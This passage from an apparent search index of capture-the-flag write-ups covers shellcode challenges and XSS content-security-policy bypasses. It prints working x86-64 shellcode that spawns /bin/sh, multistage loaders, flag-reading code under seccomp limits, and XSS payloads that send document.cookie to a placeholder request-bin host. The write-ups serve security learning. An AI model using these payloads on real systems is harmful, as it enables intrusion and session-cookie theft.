\"/bin/sh\" RAX: set to 0x3b (syscall number for execve ) RSI: set to 0x0 (NULL) RDX: set to 0x0 (NULL) The complete exploit is in script.py .","title":"gimme3bytes"},{"location":"shellcode/gimme3bytes/#gimme3bytes","text":"It reads 3 bytes from stdin and executes them as shellcode. The idea is to run a multi-stage shellcode, where the first stage is a small shellcode that call the syscall read to read the second stage from stdin. The second stage is the actual shellcode that will be executed.","title":"gimme3bytes"},{"location":"shellcode/gimme3bytes/#first-stage-3-bytes","text":"pop rdx syscall RAX: already set to 0x0a (syscall number for read ) RDI: already set to 0x0 (stdin) RSI: already set to the buffer address RDX: set using pop rdx . Why so? Because at that point the stack contains a large number that can be used as a buffer size","title":"First Stage (3 bytes)"},{"location":"shellcode/gimme3bytes/#second-stage-25-bytes","text":"Main idea: execve(RDI -> \"/bin/sh\", RSI = argv -> NULL, RDX = envp -> NULL) nop nop nop mov rdi, rsi add rdi, 0x19 mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" Note: The first three nop s are there since the RIP after the first stage is set at the end of the buffer and cannot be changed. With the three nop s we push the second stage three bytes forward right where the RIP will be set and then mov rdi, rsi will be the first instruction executed. RDI: set to the buffer address + 25, to point to the string \"/bin/sh\" RAX: set to 0x3b (syscall number for execve ) RSI: set to 0x0 (NULL) RDX: set to 0x0 (NULL) The complete exploit is in script.py .","title":"Second Stage (25 bytes)"},{"location":"shellcode/lost_in_memory/","text":"Lost In Memory lea rax, [rip] sub rax, 0x6e mov rdi, 1 mov rsi, rax mov rdx, 47 mov rax, 1 syscall RAX: 1 (SYS_WRITE) RDI: 1 (fd = STDOUT) RSI: address of the flag RDX: 47 (length of the flag in bytes) The idea is to use the address of the shellcode as the address of the string to print. The RIP contains the next instruction address. The flag is placed before the shellcode, so the address of the shellcode is the address of the flag minus 0x6e. Where 0x6e is the length of the flag. The flag is 48 (0x30) bytes long. The stub is 55 (0x37) bytes long. The first instruction of the shellcode is 7 bytes long. Then 0x30 + 0x37 + 0x7 = 0x6e, that we have to subtract from the RIP. We are using the first instruction of the shellcode because the RIP points to the next instruction. The complete exploit is in script.py .","title":"lost_in_memory"},{"location":"shellcode/lost_in_memory/#lost-in-memory","text":"lea rax, [rip] sub rax, 0x6e mov rdi, 1 mov rsi, rax mov rdx, 47 mov rax, 1 syscall RAX: 1 (SYS_WRITE) RDI: 1 (fd = STDOUT) RSI: address of the flag RDX: 47 (length of the flag in bytes) The idea is to use the address of the shellcode as the address of the string to print. The RIP contains the next instruction address. The flag is placed before the shellcode, so the address of the shellcode is the address of the flag minus 0x6e. Where 0x6e is the length of the flag. The flag is 48 (0x30) bytes long. The stub is 55 (0x37) bytes long. The first instruction of the shellcode is 7 bytes long. Then 0x30 + 0x37 + 0x7 = 0x6e, that we have to subtract from the RIP. We are using the first instruction of the shellcode because the RIP points to the next instruction. The complete exploit is in script.py .","title":"Lost In Memory"},{"location":"shellcode/multistage/","text":"multistage This challenge reads shellcode from stdin and executes it. The problem is that it reads just 20 (0x14) bytes that are not enough to write a shellcode that spawns a shell. The idea is to write a first stage that reads the second stage from stdin. First Stage mov rsi, rax xor rax, rax mov rdi, rax mov rdx, 0x1000 syscall ; 2 * 0x90 RSI: set to the address of the second stage RAX: set to 0 (SYS_read) RDI: set to 0 (stdin) RDX: set to 0x1000 (4096 bytes), the number of bytes to read (basically a random large enough number) Second Stage ; 20*0x90 to align with the RIP mov rdi, rsi add rdi, 0x2a mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" RDI: set to the address of the string \"/bin/sh\" (RSI + 0x2a) RAX: set to 0x3b (SYS_execve) RSI: set to 0 (NULL) RDX: set to 0 (NULL) Why 0x2a? Because the first stage is 20 bytes long and the second one is 22 bytes long. So the total is 42 = 0x2a. The complete exploit is in script.py .","title":"multistage"},{"location":"shellcode/multistage/#multistage","text":"This challenge reads shellcode from stdin and executes it. The problem is that it reads just 20 (0x14) bytes that are not enough to write a shellcode that spawns a shell. The idea is to write a first stage that reads the second stage from stdin.","title":"multistage"},{"location":"shellcode/multistage/#first-stage","text":"mov rsi, rax xor rax, rax mov rdi, rax mov rdx, 0x1000 syscall ; 2 * 0x90 RSI: set to the address of the second stage RAX: set to 0 (SYS_read) RDI: set to 0 (stdin) RDX: set to 0x1000 (4096 bytes), the number of bytes to read (basically a random large enough number)","title":"First Stage"},{"location":"shellcode/multistage/#second-stage","text":"; 20*0x90 to align with the RIP mov rdi, rsi add rdi, 0x2a mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" RDI: set to the address of the string \"/bin/sh\" (RSI + 0x2a) RAX: set to 0x3b (SYS_execve) RSI: set to 0 (NULL) RDX: set to 0 (NULL) Why 0x2a? Because the first stage is 20 bytes long and the second one is 22 bytes long. So the total is 42 = 0x2a. The complete exploit is in script.py .","title":"Second Stage"},{"location":"shellcode/onlyreadwrite/","text":"onlyreadwrite This challenge reads shellcode from stdin and executes it. The problem is that the syscalls that we can use are limited. What syscalls can we use? To find out what syscalls we can use there is the following command: seccomp-tools dump ./onlyreadwrite Some details about the tool can be found here . The output of the command is the following: line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL Then only open, read and write are allowed (and some other syscalls that we don't need). The shellcode Now that we know that we can use just a few syscalls, we can start writing the shellcode. The idea was to use shellcraft to generate the shellcode for the open-read-write sequence. shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0) shellcode += pwnlib.shellcraft.amd64.linux.read(FD_READ, 'rsp', 100) shellcode += pwnlib.shellcraft.amd64.linux.write(FD_WRITE = 1, 'rsp', 100) The problem is that (afaik) there is no way to get the file descriptor from the open syscall and use it as argument for the read. So i generated the assembly from shellcraft and slightly modified it to get the file descriptor in RDI (where the read syscall expects it). ; push './flag' on the stack mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x67616c662f2e xor [rsp], rax ; call open(RDI -> './flag', 0, 0) mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ push SYS_open /* 2 */ pop rax /* -> 2 */ syscall ; call read(RDI -> RAX = fd of './flag', RSI = 'rsp', RDX = 0x64) push rax xor eax, eax /* SYS_read */ pop rdi ; -> fd returned by open push 0x64 pop rdx mov rsi, rsp syscall ; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64) push 1 pop rdi push 0x64 pop rdx mov rsi, rsp push SYS_write ; 1 pop rax syscall Basically it is opening the file, reading it on the stack and then writing it on stdout. The complete exploit is in script.py .","title":"onlyreadwrite"},{"location":"shellcode/onlyreadwrite/#onlyreadwrite","text":"This challenge reads shellcode from stdin and executes it. The problem is that the syscalls that we can use are limited.","title":"onlyreadwrite"},{"location":"shellcode/onlyreadwrite/#what-syscalls-can-we-use","text":"To find out what syscalls we can use there is the following command: seccomp-tools dump ./onlyreadwrite Some details about the tool can be found here . The output of the command is the following: line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL Then only open, read and write are allowed (and some other syscalls that we don't need).","title":"What syscalls can we use?"},{"location":"shellcode/onlyreadwrite/#the-shellcode","text":"Now that we know that we can use just a few syscalls, we can start writing the shellcode. The idea was to use shellcraft to generate the shellcode for the open-read-write sequence. shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0) shellcode += pwnlib.shellcraft.amd64.linux.read(FD_READ, 'rsp', 100) shellcode += pwnlib.shellcraft.amd64.linux.write(FD_WRITE = 1, 'rsp', 100) The problem is that (afaik) there is no way to get the file descriptor from the open syscall and use it as argument for the read. So i generated the assembly from shellcraft and slightly modified it to get the file descriptor in RDI (where the read syscall expects it). ; push './flag' on the stack mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x67616c662f2e xor [rsp], rax ; call open(RDI -> './flag', 0, 0) mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ push SYS_open /* 2 */ pop rax /* -> 2 */ syscall ; call read(RDI -> RAX = fd of './flag', RSI = 'rsp', RDX = 0x64) push rax xor eax, eax /* SYS_read */ pop rdi ; -> fd returned by open push 0x64 pop rdx mov rsi, rsp syscall ; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64) push 1 pop rdi push 0x64 pop rdx mov rsi, rsp push SYS_write ; 1 pop rax syscall Basically it is opening the file, reading it on the stack and then writing it on stdout. The complete exploit is in script.py .","title":"The shellcode"},{"location":"shellcode/server/","text":"server This challenge is very similar to the Only Read Write challenge. The only difference is that the binary now is a server that listens on a port and forks a child process that reads in a buffer. Then we have to write not on stdout but on the socket file descriptor. mov r12, rdi mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x67616c662f2e xor [rsp], rax mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call open() */ push SYS_open /* 2 */ pop rax syscall /* call read(fd_open, 'rsp', 0x64) */ push rax xor eax, eax /* SYS_read */ pop rdi push 0x64 pop rdx mov rsi, rsp syscall /* write(fd_socket, buf='rsp', n=0x64) */ push r12 pop rdi push 0x64 pop rdx mov rsi, rsp /* call write() */ push SYS_write /* 1 */ pop rax syscall In this case I used R12 to store the socket file descriptor. The shellcode is the same as the previous challenge, except for the write part were we put R12 in RDI, and then we call write. The process forked from the server executes this function void prog(int socket_fd) { size_t n; char name [1008]; get_name(socket_fd, name); write(socket_fd, \"Hello Mr.\", 9); n = strlen(name); write(socket_fd, name, n); return; } get_name() is reading 4096 bytes in a buffer of 1008 bytes, so we have a buffer overflow. We overflow the buffer with the shellcode and modify the return address to point to it. We know the address of the shellcode because it is in the .bss section and the binary is not PIE. The complete exploit is in script.py .","title":"server"},{"location":"shellcode/server/#server","text":"This challenge is very similar to the Only Read Write challenge. The only difference is that the binary now is a server that listens on a port and forks a child process that reads in a buffer. Then we have to write not on stdout but on the socket file descriptor. mov r12, rdi mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x67616c662f2e xor [rsp], rax mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call open() */ push SYS_open /* 2 */ pop rax syscall /* call read(fd_open, 'rsp', 0x64) */ push rax xor eax, eax /* SYS_read */ pop rdi push 0x64 pop rdx mov rsi, rsp syscall /* write(fd_socket, buf='rsp', n=0x64) */ push r12 pop rdi push 0x64 pop rdx mov rsi, rsp /* call write() */ push SYS_write /* 1 */ pop rax syscall In this case I used R12 to store the socket file descriptor. The shellcode is the same as the previous challenge, except for the write part were we put R12 in RDI, and then we call write. The process forked from the server executes this function void prog(int socket_fd) { size_t n; char name [1008]; get_name(socket_fd, name); write(socket_fd, \"Hello Mr.\", 9); n = strlen(name); write(socket_fd, name, n); return; } get_name() is reading 4096 bytes in a buffer of 1008 bytes, so we have a buffer overflow. We overflow the buffer with the shellcode and modify the return address to point to it. We know the address of the shellcode because it is in the .bss section and the binary is not PIE. The complete exploit is in script.py .","title":"server"},{"location":"shellcode/tiny/","text":"tiny tiny reads from stdin and executes what it reads as shellcode. The problem is that it uses libcapstone to disassemble the shellcode and it checks whether the shellcode contains instructions with more than 2 bytes. If it does, it exits withou executing our shellcode. First Solution This is the first solution I came up with. It's not the best one, but it works. Basically, it is multistage exploit. The first stage is a shellcode that reads the second stage from stdin. The second stage is the actual shellcode that spawns a shell. First Stage xor edi, edi push rdx pop rsi xor edx, edx push 100 pop dx syscall RDI: is set to 0, so the read syscall will read from stdin. RSI: it must be set to the address where the shellcode will be written. The trick to have instructions with less than 2 bytes is to use POP/PUSH instead of MOV. RDX: is set to 100, so the read syscall will read 100 bytes. The same trick used for RSI is used here. RAX: it's not changed because it already contains 0 (the read syscall number). Second Stage mov rdi, rsi add rdi, 0x22 mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" RDI: it must be set to the address of the string \"/bin/sh\". 0x22 is the offset of the string from the address where the shellcode is written. RAX: it's set to 0x3b (the execve syscall number). RSI: it's set to 0. RDX: it's set to 0. Note: Why 0x22? Because the first stage is 12 byte long. The second one 22. Then 34=0x22. We need to consider the first stage because the RIP at the end of the first stage will point right after the first stage and we are writing at the beginning of the first stage. In fact, we need to put also 12 NOPs at the beginning of the second stage. Second Solution This is the second solution I came up with. It's better than the first one because it's a single stage exploit. The shellcode doesn't contain instructions with more than 2 bytes. push rdx pop rax add al, 0x10 push rax pop rdi xor eax, eax mov al, 0x3b xor edx, edx xor esi, esi syscall .string \"/bin/sh\" RAX: it's set to RDX+0x10. RDX contains the address of the shellcode, so RAX will contain the address of the string \"/bin/sh\" and 0x10 is the offset of the string from the address of the shellcode in fact the shellcode is 16 byte long. RDI: it's set to RAX. We are using RAX here to temporarily store the address of the string \"/bin/sh\" because for some reason the add al, 0x10 it's just 2 bytes long. RAX: it's set to 0x3b (the execve syscall number). RSI: it's set to 0. RDX: it's set to 0. The complete exploit is in script.py .","title":"tiny"},{"location":"shellcode/tiny/#tiny","text":"tiny reads from stdin and executes what it reads as shellcode. The problem is that it uses libcapstone to disassemble the shellcode and it checks whether the shellcode contains instructions with more than 2 bytes. If it does, it exits withou executing our shellcode.","title":"tiny"},{"location":"shellcode/tiny/#first-solution","text":"This is the first solution I came up with. It's not the best one, but it works. Basically, it is multistage exploit. The first stage is a shellcode that reads the second stage from stdin. The second stage is the actual shellcode that spawns a shell.","title":"First Solution"},{"location":"shellcode/tiny/#first-stage","text":"xor edi, edi push rdx pop rsi xor edx, edx push 100 pop dx syscall RDI: is set to 0, so the read syscall will read from stdin. RSI: it must be set to the address where the shellcode will be written. The trick to have instructions with less than 2 bytes is to use POP/PUSH instead of MOV. RDX: is set to 100, so the read syscall will read 100 bytes. The same trick used for RSI is used here. RAX: it's not changed because it already contains 0 (the read syscall number).","title":"First Stage"},{"location":"shellcode/tiny/#second-stage","text":"mov rdi, rsi add rdi, 0x22 mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" RDI: it must be set to the address of the string \"/bin/sh\". 0x22 is the offset of the string from the address where the shellcode is written. RAX: it's set to 0x3b (the execve syscall number). RSI: it's set to 0. RDX: it's set to 0. Note: Why 0x22? Because the first stage is 12 byte long. The second one 22. Then 34=0x22. We need to consider the first stage because the RIP at the end of the first stage will point right after the first stage and we are writing at the beginning of the first stage. In fact, we need to put also 12 NOPs at the beginning of the second stage.","title":"Second Stage"},{"location":"shellcode/tiny/#second-solution","text":"This is the second solution I came up with. It's better than the first one because it's a single stage exploit. The shellcode doesn't contain instructions with more than 2 bytes. push rdx pop rax add al, 0x10 push rax pop rdi xor eax, eax mov al, 0x3b xor edx, edx xor esi, esi syscall .string \"/bin/sh\" RAX: it's set to RDX+0x10. RDX contains the address of the shellcode, so RAX will contain the address of the string \"/bin/sh\" and 0x10 is the offset of the string from the address of the shellcode in fact the shellcode is 16 byte long. RDI: it's set to RAX. We are using RAX here to temporarily store the address of the string \"/bin/sh\" because for some reason the add al, 0x10 it's just 2 bytes long. RAX: it's set to 0x3b (the execve syscall number). RSI: it's set to 0. RDX: it's set to 0. The complete exploit is in script.py .","title":"Second Solution"},{"location":"symbolic/","text":"Symbolic Execution and Fuzzing This set of challenges is about symbolic execution and fuzzing. The goal is to find a string that satisfies a set of constraints. Challenges: cracksymb pnrg prodkey","title":"Symbolic Execution and Fuzzing"},{"location":"symbolic/#symbolic-execution-and-fuzzing","text":"This set of challenges is about symbolic execution and fuzzing. The goal is to find a string that satisfies a set of constraints. Challenges: cracksymb pnrg prodkey","title":"Symbolic Execution and Fuzzing"},{"location":"xss/csp/","text":"csp On the second page, name and comment are vulnerable to XSS. The CSP header is: Content-Security-Policy default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none' We can download the angular.js file from https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js and then use the following payload to bypass the CSP: <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor(\"alert(1)\")()}}> To get the flag, we can use the following payload: <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor(\"window.location.href='https://some.request.bin.site?cookie='+document.cookie\")()}}> Note that this payload works because the unsafe-eval directive is present in the CSP header.","title":"csp"},{"location":"xss/csp/#csp","text":"On the second page, name and comment are vulnerable to XSS. The CSP header is: Content-Security-Policy default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none' We can download the angular.js file from https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js and then use the following payload to bypass the CSP: <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor(\"alert(1)\")()}}> To get the flag, we can use the following payload: <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor(\"window.location.href='https://some.request.bin.site?cookie='+document.cookie\")()}}> Note that this payload works because the unsafe-eval directive is present in the CSP header.","title":"csp"},{"location":"xss/strict-csp/","text":"strict-csp Same as csp , name and comment are vulnerable to XSS. The CSP header is: Content-Security-Policy default-src 'self'; script-src 'strict-dynamic' 'nonce-EBZ5Jp7Kqi'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none' Referrer Policy: strict-origin-when-cross-origin With <script data-main='data:1,\"use strict\"%0d%0awindow.location.href=\"some.request.bin.site?cookie=\"+document.cookie' src='require.js'></script> we can bypass the CSP.","title":"strict-csp"},{"location":"xss/strict-csp/#strict-csp","text":"Same as csp , name and comment are vulnerable to XSS. The CSP header is: Content-Security-Policy default-src 'self'; script-src 'strict-dynamic' 'nonce-EBZ5Jp7Kqi'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none' Referrer Policy: strict-origin-when-cross-origin With <script data-main='data:1,\"use strict\"%0d%0awindow.location.href=\"some.request.bin.site?cookie=\"+document.cookie' src='require.js'></script> we can bypass the CSP.","title":"strict-csp"}]}